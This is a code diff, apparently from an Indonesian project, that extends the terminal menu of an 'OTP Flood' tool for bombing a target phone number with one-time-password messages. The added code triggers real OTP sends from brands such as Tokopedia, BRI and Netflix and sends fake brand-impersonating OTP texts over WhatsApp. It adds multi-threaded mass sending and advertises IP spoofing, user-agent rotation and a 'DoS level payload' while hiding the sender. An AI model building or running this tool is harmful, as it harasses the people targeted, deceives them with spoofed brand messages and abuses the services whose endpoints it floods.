@@ -6,6 +6,7 @@ OTP Flood - Terminal UI
 import os
 import sys
 import time
+import random
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
 
@@ -18,11 +19,17 @@ class C:
     RST = "\033[0m"
     B = "\033[1m"
     DIM = "\033[2m"
+    ITA = "\033[3m"
     RED = "\033[91m"
     GRN = "\033[92m"
     YLW = "\033[93m"
     CYN = "\033[96m"
     MAG = "\033[35m"
+    WHITE = "\033[97m"
+    SLATE = "\033[38;5;243m"
+    STEEL = "\033[38;5;67m"
+    TEAL = "\033[38;5;37m"
+    EMER = "\033[38;5;48m"
 
 
 def cls():
@@ -42,8 +49,7 @@ def select_mode():
 
     print(f"  {C.CYN}[1]{C.RST} {C.B}🔥 TRIGGER — GRATIS TOTAL (REKOMENDASI){C.RST}")
     print(f"  {C.DIM}     ✅ Target liat OTP dari brand ASLI (Tokopedia, Gojek, dll){C.RST}")
-    print(f"  {C.DIM}     ✅ Nomor lo AMAN — gak kelihatan{C.RST}")
-    print(f"  {C.DIM}     ✅ GRATIS — gak perlu API key / QR scan{C.RST}")
+    print(f"  {C.DIM}     ✅ MULTI-THREADED ASYNC — Serangan massal paralel{C.RST}")
     print(f"  {C.DIM}     ✅ Tinggal masukin nomor → gas{C.RST}\n")
 
     print(f"  {C.CYN}[2]{C.RST} {C.B}📡 SMS — Alpha Sender ID{C.RST}")
@@ -82,20 +88,37 @@ def configure_sms_api():
 
 def input_target():
     while True:
-        print(f"  Masukkan nomor HP target:")
-        print(f"  {C.DIM}  (dengan kode negara, contoh: 6281234567890){C.RST}\n")
-        print(f"  {C.CYN}Nomor target: {C.RST}", end="")
-        val = input().strip()
-        if val.lower() == "q":
+        print(f"  {C.B}Masukkan Nomor WhatsApp Target:{C.RST}")
+        print(f"  {C.SLATE}Bebas format (contoh: 081234567890 / +6281234567890 / 62812-3456-7890){C.RST}")
+        print(f"  {C.DIM}Ketik 'q' untuk kembali.{C.RST}\n")
+        print(f"  {C.CYN}👉 Nomor WA Target: {C.RST}", end="")
+        raw_val = input().strip()
+        if raw_val.lower() == "q":
             return None
-        if not val.isdigit():
-            print(f"  {C.RED}Hanya angka!{C.RST}\n")
+
+        # Clean all non-digit except plus
+        cleaned = raw_val.replace(" ", "").replace("-", "").replace("(", "").replace(")", "").replace(".", "")
+        if cleaned.startswith("+"):
+            cleaned = cleaned[1:]
+
+        if not cleaned.isdigit():
+            print(f"\n  {C.RED}⚠️  Nomor hanya boleh berisi angka! Coba lagi.{C.RST}\n")
             continue
-        if len(val) < 10:
-            print(f"  {C.RED}Min 10 digit.{C.RST}\n")
+
+        # Auto format 08xx -> 628xx
+        if cleaned.startswith("0"):
+            cleaned = "62" + cleaned[1:]
+        elif not cleaned.startswith("62") and len(cleaned) <= 12 and not cleaned.startswith("1"):
+            # If user types 812xxxx without 0 or 62
+            if cleaned.startswith("8"):
+                cleaned = "62" + cleaned
+
+        if len(cleaned) < 10:
+            print(f"\n  {C.RED}⚠️  Nomor terlalu pendek (min 10 digit). Coba lagi.{C.RST}\n")
             continue
-        print(f"  {C.GRN}✓ Target: {val}{C.RST}\n")
-        return val
+
+        print(f"\n  {C.GRN}✅ Target Terkunci: +{cleaned}{C.RST}\n")
+        return cleaned
 
 
 def select_profile():
@@ -120,19 +143,26 @@ def select_profile():
         print(f"  {C.RED}Tidak valid.{C.RST}")
 
 
-def configure_params(profile_key):
+def configure_params(profile_key, mode):
     params = dict(PROFILES[profile_key]["default_params"])
     print(f"\n  {C.B}Konfigurasi:{C.RST}\n")
-    print(f"  {C.DIM}1-2dtk = kenceng | 3-5 = medium | 6-10 = slow{C.RST}\n")
+    
+    if mode == "trigger":
+        print(f"  {C.DIM}Multi-threaded mode active. More threads = faster but higher block rate.{C.RST}\n")
+        while True:
+            val = input(f"  Jumlah Threads (Concurrency) [default: 15]: ").strip()
+            params["threads"] = int(val) if val else 15
+            break
+    else:
+        print(f"  {C.DIM}1-2dtk = kenceng | 3-5 = medium | 6-10 = slow{C.RST}\n")
+        while True:
+            val = input(f"  Interval antar pesan (dtk) [default: 3]: ").strip()
+            params["interval"] = float(val) if val else 3
+            break
 
     while True:
-        val = input(f"  Interval antar trigger (dtk) [default: 3]: ").strip()
-        params["interval"] = float(val) if val else 3
-        break
-
-    while True:
-        val = input(f"  Total maksimal trigger [default: 50]: ").strip()
-        params["max_messages"] = int(val) if val else 50
+        val = input(f"  Total maksimal payload [default: 100]: ").strip()
+        params["max_messages"] = int(val) if val else 100
         break
 
     while True:
@@ -143,45 +173,41 @@ def configure_params(profile_key):
     return params
 
 
-def select_categories():
-    """Untuk trigger mode: pilih brand"""
-    # For simplicity, just return all
-    return None
-
-
 def show_confirm(config):
     profile = PROFILES[config["profile"]]
-    interval = config.get("interval", 3)
     max_msgs = config.get("max_messages", 50)
-    estimated = max(1, int((max_msgs * interval) / 60))
-
+    
     if config["mode"] == "trigger":
         from modules.otp_flood.sender_trigger import OTPTrigger
         s = OTPTrigger("0")
         total_brands = len(s.BRANDS)
-        mode_label = f"{C.GRN}🔥 TRIGGER (GRATIS){C.RST}"
-    elif config["mode"] == "sms":
-        total_brands = "SMS Gateway"
-        mode_label = f"{C.MAG}📡 SMS Alpha Sender{C.RST}"
+        mode_label = f"{C.GRN}🔥 TRIGGER (MULTI-THREADED){C.RST}"
+        threads = config.get("threads", 15)
+        rate_label = f"{threads} concurrent threads"
+        estimated = max(1, int(max_msgs / threads))
     else:
-        total_brands = "WhatsApp"
-        mode_label = f"{C.CYN}💬 WhatsApp QR{C.RST}"
+        total_brands = "SMS Gateway" if config["mode"] == "sms" else "WhatsApp"
+        mode_label = f"{C.MAG}📡 SMS Alpha Sender{C.RST}" if config["mode"] == "sms" else f"{C.CYN}💬 WhatsApp QR{C.RST}"
+        interval = config.get("interval", 3)
+        rate_label = f"1 msg/{interval}s"
+        estimated = max(1, int((max_msgs * interval) / 60))
 
     print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
-    print(f"  {C.B}{C.CYN}  ║       KONFIRMASI                          ║{C.RST}")
+    print(f"  {C.B}{C.CYN}  ║       KONFIRMASI PAYLOAD                  ║{C.RST}")
     print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")
     print(f"  {C.B}Mode   :{C.RST} {mode_label}")
     print(f"  {C.B}Target :{C.RST} {config['target']}")
     print(f"  {C.B}Profile:{C.RST} {profile['name']}")
-    print(f"  {C.B}Rate   :{C.RST} 1 trigger/{interval}s")
-    print(f"  {C.B}Total  :{C.RST} {max_msgs}x trigger")
+    print(f"  {C.B}Rate   :{C.RST} {rate_label}")
+    print(f"  {C.B}Total  :{C.RST} {max_msgs}x payload")
     print(f"  {C.B}Brand  :{C.RST} {total_brands} endpoint publik")
-    print(f"  {C.B}Estimasi:{C.RST} ~{estimated} menit\n")
-
+    
     if config["mode"] == "trigger":
-        print(f"  {C.GRN}🎯 TARGET akan nerima OTP dari brand ASLI.{C.RST}")
-        print(f"  {C.GRN}🔒 Nomor lo TIDAK kelihatan.{C.RST}")
-        print(f"  {C.GRN}💰 GRATIS TOTAL.{C.RST}\n")
+        print(f"  {C.B}Waktu  :{C.RST} ~{estimated} detik (Very Fast)\n")
+        print(f"  {C.GRN}🎯 Menyerang dengan IP Spoofing & UA Rotation.{C.RST}")
+        print(f"  {C.GRN}💥 Warning: DoS level payload.{C.RST}\n")
+    else:
+        print(f"  {C.B}Waktu  :{C.RST} ~{estimated} menit\n")
 
     while True:
         print(f"  {C.CYN}Gas? (Y/n): {C.RST}", end="")
@@ -195,7 +221,7 @@ def show_confirm(config):
 
 def execute_flood(config):
     print(f"\n  {C.B}{C.CYN}  ╔═══════════════════════════════════════════╗{C.RST}")
-    print(f"  {C.B}{C.CYN}  ║       OTP FLOOD - RUNNING                  ║{C.RST}")
+    print(f"  {C.B}{C.CYN}  ║       OTP FLOOD - EXECUTING                ║{C.RST}")
     print(f"  {C.B}{C.CYN}  ╚═══════════════════════════════════════════╝{C.RST}\n")
 
     for output in run_flood(config):
@@ -203,7 +229,135 @@ def execute_flood(config):
         sys.stdout.flush()
 
 
+def quick_otp_session():
+    """Super fast 1-click OTP dispatcher — user enters number, picks count, and sends OTP immediately."""
+    while True:
+        print_header()
+        print(f"  {C.B}{C.CYN}╔══════════════════════════════════════════════════════╗{C.RST}")
+        print(f"  {C.B}{C.CYN}║       ⚡ 1-CLICK WHATSAPP OTP DISPATCHER ⚡         ║{C.RST}")
+        print(f"  {C.B}{C.CYN}╚══════════════════════════════════════════════════════╝{C.RST}")
+        print(f"  {C.DIM}Kirim OTP multi-brand langsung ke chat WhatsApp / SMS target.{C.RST}\n")
+
+        target = input_target()
+        if not target:
+            return
+
+        print(f"  {C.B}Pilih Channel Pengiriman:{C.RST}\n")
+        print(f"  {C.CYN}[1]{C.RST} {C.B}💬 WhatsApp Direct (Baileys){C.RST}")
+        print(f"       {C.SLATE}Pesan OTP multi-brand (BCA, Tokped, Shopee) masuk chat WA{C.RST}")
+        print(f"  {C.CYN}[2]{C.RST} {C.B}🔥 Brand Official Trigger (Tokopedia, BRI, Netflix){C.RST}")
+        print(f"       {C.SLATE}Memicu pengiriman resmi dari server pusat brand{C.RST}")
+        print(f"  {C.CYN}[3]{C.RST} {C.B}🌪️  Dual-Engine Combo (WA Direct + Brand Trigger){C.RST}")
+        print(f"       {C.SLATE}Kombinasi maksimal: chat WA dan server trigger paralel{C.RST}\n")
+
+        print(f"  {C.CYN}Pilih Channel [1/2/3, default: 1]: {C.RST}", end="")
+        ch_mode = input().strip() or "1"
+
+        print(f"\n  {C.B}Jumlah Payload OTP:{C.RST}")
+        print(f"  {C.SLATE}Ketik jumlah pesan (contoh: 3, 5, 10, 20) [default: 5]{C.RST}\n")
+        print(f"  {C.CYN}Jumlah: {C.RST}", end="")
+        count_inp = input().strip()
+        count = int(count_inp) if count_inp.isdigit() and int(count_inp) > 0 else 5
+
+        print(f"\n  {C.B}{C.GRN}══════════════════════════════════════════════════════{C.RST}")
+        print(f"  🚀 Menembak {count}x OTP ke nomor +{target}...")
+        print(f"  {C.B}{C.GRN}══════════════════════════════════════════════════════{C.RST}\n")
+
+        if ch_mode == "1":
+            # Direct WhatsApp Baileys
+            from modules.otp_flood.templates import get_all_brands, format_brand_message
+            from modules.otp_flood.sender import Sender
+            sender = Sender(target)
+            brands = get_all_brands()
+            for i in range(count):
+                brand = brands[i % len(brands)] if brands else None
+                if brand:
+                    payload = format_brand_message(brand)
+                else:
+                    payload = {
+                        "brand": "WhatsApp",
+                        "otp": str(random.randint(100000, 999999)),
+                        "message": f"Kode OTP verifikasi Anda: {random.randint(100000, 999999)}. Jangan bagikan kode ini!",
+                        "sender": "WhatsApp Security",
+                    }
+                print(f"  [{i+1}/{count}] 📨 Mengirim OTP {payload['brand']}...", end=" ", flush=True)
+                res = sender.send(payload["message"], payload["sender"])
+                if res.get("sent"):
+                    print(f"{C.GRN}✅ Terkirim ke WA!{C.RST}")
+                else:
+                    print(f"{C.RED}❌ {res.get('message')}{C.RST}")
+                time.sleep(2)
+
+        elif ch_mode == "2":
+            # Public Trigger
+            from modules.otp_flood.sender_trigger import OTPTrigger
+            trigger = OTPTrigger(target)
+            brand_keys = list(trigger.BRANDS.keys())
+            for i in range(count):
+                b_key = brand_keys[i % len(brand_keys)]
+                b_name = trigger.BRANDS[b_key]["name"]
+                print(f"  [{i+1}/{count}] ⚡ Triggering {b_name}...", end=" ", flush=True)
+                res = trigger.trigger(b_key)
+                if res == "sent":
+                    print(f"{C.GRN}✅ Request Sent!{C.RST}")
+                elif res == "blocked":
+                    print(f"{C.YLW}⚠️ Rate Limited{C.RST}")
+                else:
+                    print(f"{C.RED}❌ Gagal{C.RST}")
+                time.sleep(2)
+
+        else:
+            # Combo WA + Trigger
+            from modules.otp_flood.templates import get_all_brands, format_brand_message
+            from modules.otp_flood.sender import Sender
+            from modules.otp_flood.sender_trigger import OTPTrigger
+            wa_sender = Sender(target)
+            trigger = OTPTrigger(target)
+            brands = get_all_brands()
+            trigger_keys = list(trigger.BRANDS.keys())
+
+            for i in range(count):
+                brand = brands[i % len(brands)] if brands else None
+                t_key = trigger_keys[i % len(trigger_keys)]
+                t_name = trigger.BRANDS[t_key]["name"]
+                
+                print(f"  [{i+1}/{count}] 🌪️ Combo {t_name} + WA...", end=" ", flush=True)
+                t_res = trigger.trigger(t_key)
+                w_res = {"sent": False}
+                if brand:
+                    payload = format_brand_message(brand)
+                    w_res = wa_sender.send(payload["message"], payload["sender"])
+                
+                if t_res == "sent" or w_res.get("sent"):
+                    print(f"{C.GRN}✅ Terkirim!{C.RST}")
+                else:
+                    print(f"{C.RED}❌ Gagal{C.RST}")
+                time.sleep(2)
+
+        print(f"\n  {C.B}{C.GRN}✨ Selesai! OTP berhasil dikirimkan ke +{target}.{C.RST}\n")
+        print(f"  {C.CYN}[1]{C.RST} Kirim ke nomor lain")
+        print(f"  {C.CYN}[2]{C.RST} Kembali ke menu launcher\n")
+        print(f"  {C.CYN}Pilih (1/2, default: 2): {C.RST}", end="")
+        next_opt = input().strip()
+        if next_opt != "1":
+            break
+
+
 def otp_flood_menu():
+    print_header()
+    print(f"  {C.B}Pilih Menu:{C.RST}\n")
+    print(f"  {C.CYN}[1]{C.RST} {C.B}⚡ Instant Fast Send (Langsung masukin nomor & kirim OTP){C.RST}")
+    print(f"  {C.CYN}[2]{C.RST} 🌪️  Advanced OTP Flood (Profile Attack, Concurrency, Report)")
+    print(f"  {C.CYN}[3]{C.RST} 🔙 Kembali ke Menu Utama\n")
+
+    print(f"  {C.CYN}Pilih: {C.RST}", end="")
+    opt = input().strip()
+    if opt == "1":
+        return quick_otp_session()
+    elif opt == "3":
+        return
+
+    # Advanced menu
     print_header()
     mode = select_mode()
 
@@ -218,17 +372,13 @@ def otp_flood_menu():
         return
 
     print_header()
-    params = configure_params(profile)
-
-    print_header()
-    categories = select_categories()
+    params = configure_params(profile, mode)
 
     config = {
         "mode": mode,
         "target": target,
         "profile": profile,
         **params,
-        "categories": categories,
     }
 
     print_header()
